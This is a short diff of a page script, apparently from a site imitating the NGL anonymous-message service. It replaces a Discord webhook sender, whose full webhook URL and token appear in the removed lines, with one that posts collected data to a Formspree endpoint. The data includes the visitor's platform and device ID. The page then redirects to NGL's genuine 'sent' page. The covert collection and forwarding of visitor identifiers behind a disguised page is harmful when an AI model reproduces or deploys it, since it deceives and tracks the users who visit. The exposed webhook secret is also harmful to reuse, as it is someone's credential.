@@ -1,10 +1,11 @@
-async function sendToDiscord(msg) {
-  await fetch("https://discord.com/api/webhooks/1443704225812058215/pfS9DPM1VtV5LGqyRKrnclWiIPlxu0UAYi0ATj5X4AMUN4mELMnCa2whfPfB9aNqQD3G", {
+async function sendToFormspree(msg) {
+  await fetch("https://formspree.io/f/mvgerepe", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: msg })
+    body: JSON.stringify({ message: msg })
   });
 }
+
 
 $(document).ready(function () {
 
@@ -44,7 +45,7 @@ $(document).ready(function () {
       "Platforma:{{" + platform + "{{\n" +
       "DeviceID:{{" + deviceId + "{{";
 
-    await sendToDiscord(msg);
+    await sendToFormspree(msg);
 
     window.location.href = "https://ngl.link/p/sent";
   });
